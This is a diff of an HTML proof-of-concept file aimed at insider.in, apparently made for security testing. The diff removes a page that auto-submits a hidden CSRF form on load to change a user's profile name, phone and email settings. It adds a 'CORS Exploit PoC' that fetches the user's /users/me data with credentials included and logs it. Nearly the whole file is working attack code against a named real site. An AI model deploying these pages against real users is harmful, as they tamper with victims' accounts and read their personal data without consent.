@@ -1,14 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Attack Test</title>
+    <title>CORS PoC</title>
 </head>
-<body onload="document.forms[0].submit()">
-    <form action="https://insider.in/users/updateProfile" method="POST">
-        <input type="hidden" name="first_name" value="CSRF-Test">
-        <input type="hidden" name="last_name" value="Exploited">
-        <input type="hidden" name="phone_no" value="+0000000000">
-        <input type="hidden" name="promotional_emails" value="never">
-    </form>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <button onclick="exploit()">Exploit CORS</button>
+    <script>
+        function exploit() {
+            fetch('https://insider.in/users/me', {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Data:', data);
+                alert('Check the console for the response data.');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to exploit CORS.');
+            });
+        }
+    </script>
 </body>
 </html>
